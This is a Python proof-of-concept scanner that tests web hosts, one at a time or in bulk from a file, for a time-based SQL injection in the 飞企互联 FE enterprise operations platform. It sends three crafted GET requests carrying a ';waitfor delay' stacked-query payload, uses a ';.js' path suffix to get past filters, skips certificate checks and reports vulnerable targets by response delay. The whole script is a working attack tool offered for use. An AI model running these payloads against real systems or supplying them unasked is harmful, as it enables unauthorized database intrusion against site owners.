#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import http.client
import ssl
import argparse
from urllib.parse import urlparse
import time

RED = '\033[91m'
RESET = '\033[0m'

# Function to check vulnerability
def check_vulnerability(url, endpoint):
    try:
        # Construct the attack URL
        parsed_url = urlparse(url)
        path = parsed_url.path.rstrip('/') + endpoint
      
        # Determine if the URL uses HTTP or HTTPS
        if parsed_url.scheme == "https":
            # Ignore SSL certificate verification
            conn = http.client.HTTPSConnection(parsed_url.netloc, context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(parsed_url.netloc)
        
        start_time = time.time()
        # Send the request
        conn.request("GET", path)
      
        # Get the response
        response = conn.getresponse()
  
        elapsed_time = time.time() - start_time
  
        if 4 <= elapsed_time < 6:
            print(f"{RED}URL [{url}] 可能存在飞企互联FE企业运营管理平台 {endpoint} SQL注入漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except Exception as e:
        print(f"URL [{url}] 请求失败: {e}")

# Main function to parse arguments and check vulnerability
def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在飞企互联FE企业运营管理平台 SQL注入漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    endpoints = [
        "/common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:4%27--+",
        "/common/efficientCodewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:4%27--+",
        "/docexchangeManage/checkGroupCode.jsp;.js?code=1%27;waitfor+delay+%270:0:4%27--+"
    ]

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        for endpoint in endpoints:
            check_vulnerability(args.url, endpoint)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                for endpoint in endpoints:
                    check_vulnerability(url, endpoint)

if __name__ == '__main__':
    main()
